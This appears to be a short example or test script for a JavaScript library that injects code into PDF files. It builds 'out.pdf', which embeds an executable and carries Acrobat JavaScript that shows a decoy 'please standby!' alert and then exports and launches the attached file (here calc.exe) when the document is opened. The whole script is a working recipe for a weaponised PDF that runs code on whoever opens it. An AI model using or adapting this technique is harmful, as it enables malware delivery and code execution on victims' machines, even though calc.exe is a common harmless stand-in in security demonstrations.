import { inject_pdf, loadPDFPath } from "../index.js";

const pdf = await loadPDFPath("test.pdf")

const js = `
app.alert("please standby!");
this.exportDataObject({ cName: "calc.exe", nLaunch: 1 });
`;

await inject_pdf(pdf, 'out.pdf', js, ["calc.exe"]);
console.log("PDF injected successfully!");